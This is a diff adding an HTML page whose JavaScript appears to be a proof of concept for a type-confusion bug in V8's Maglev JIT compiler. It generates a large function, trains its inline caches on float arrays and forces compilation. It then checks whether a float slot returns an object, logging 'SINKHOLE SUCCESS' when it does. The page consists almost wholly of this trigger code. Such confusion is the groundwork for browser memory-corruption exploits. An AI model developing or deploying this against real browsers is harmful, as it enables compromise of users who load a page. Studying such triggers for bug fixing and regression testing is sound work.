@@ -1,0 +1,44 @@
+<!DOCTYPE html><html><body><script>
+let lines = [];
+lines.push("function testC(x, arr, obj) {");
+for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+lines.push("  arr[0] = obj;");
+lines.push("  let r = 0;");
+lines.push("  while (r < 1) {");
+lines.push("    r = arr[1];");
+lines.push("    break;");
+lines.push("  }");
+lines.push("  return r;");
+lines.push("}");
+lines.push("return testC;");
+
+let fn = new Function(lines.join("\n"))();
+let dummy = { a: 1 };
+
+console.log("1. Recording transition in IC...");
+for (let i = 0; i < 10; i++) {
+  let a = [1.1, 2.2, 3.3];
+  fn(1000, a, dummy);
+}
+
+console.log("2. Warming up invocation count...");
+let stable = [dummy, 2.2, 3.3];
+for (let i = 0; i < 20000; i++) {
+  fn(i, stable, dummy);
+}
+
+console.log("3. Waiting for Maglev compilation...");
+for (let attempt = 0; attempt < 50; attempt++) {
+  let t0 = Date.now();
+  while (Date.now() - t0 < 30); // 30ms sleep
+  let farr = [1.1, 2.2, 3.3];
+  let res = fn(1000, farr, dummy);
+  if (typeof res === "object") {
+    console.log(`=== SINKHOLE SUCCESS! Attempt ${attempt}: Type: object! Object:`, res, "===");
+    break;
+  }
+  if (attempt === 0 || attempt % 15 === 0) {
+    console.log(`Attempt ${attempt}: res is ${typeof res} ${res}`);
+  }
+}
+</script></body></html>
